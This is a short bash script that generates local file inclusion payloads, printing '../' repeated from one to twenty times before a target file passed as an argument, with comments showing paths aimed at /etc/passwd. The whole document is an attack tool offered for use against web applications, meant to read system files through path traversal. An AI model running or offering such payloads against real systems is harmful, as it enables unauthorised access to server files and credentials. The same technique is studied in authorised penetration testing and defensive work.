#!/bin/bash
# A custom shell script to create LFI payloads
# ../etc/passwd
# ../../etc/passwd
# ../../../etc/passwd
for (( i = 1; i <= 20; i++ ))      ### Outer for-loop ###
do

    for (( j = 1 ; j <= i; j++ )) ### Inner for-loop ###
    do
          echo -n "../"
          
    done
  echo -n $1
  echo "" #### print the new line ###
done
